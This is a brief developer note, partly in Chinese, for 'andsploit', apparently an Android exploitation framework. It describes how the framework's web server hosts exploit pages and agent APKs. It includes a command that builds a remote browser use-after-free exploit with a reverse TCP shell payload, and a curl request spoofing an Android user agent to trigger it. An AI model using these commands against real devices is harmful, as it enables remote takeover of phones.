andsploit development
===================

##debug:
`
from andsploit import android
if android.debug:
	do something
`

##web接口:
类路径:
`src/andsploit/server/files.py	`	
文件类型:	
使用"w","a",NONE 区分

###1.FileResource
既在根目录下的文件

###2.InMemoryResource
直接将文件放于内存中

例子:		
`
self.upload(arguments, "/agent.apk", self.build_agent(arguments), magic="A", mimetype="application/vnd.android.package-archive")
`

###3.InMemoryMultipartResource
较大的文件,分多块,符合http的boundary拆分


例子:		
`
self.build_multipart({ ".*Android.*2\.1.*AppleWebKit.*" : "<html>123</html>" }, "gc0p4Jq0M2Yt08jU534c0p")
`

使用gc0p4Jq0M2Yt08jU534c0p为http boundary

参数1:匹配规则	
例子:		
`
andsploit exploit build exploit.remote.browser.useafterfree --payload weasel.reverse_tcp.armeabi
curl --header "User-Agent: Mozilla/5.0 (Linux; U; Android 3.2.1; en-gb; HTC Flyer P510e Build/HTK75C) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13" --header "true; boundary=gc0p4Jq0M2Yt08jU534c0p" http://127.0.0.1:31415/main4.html
`




 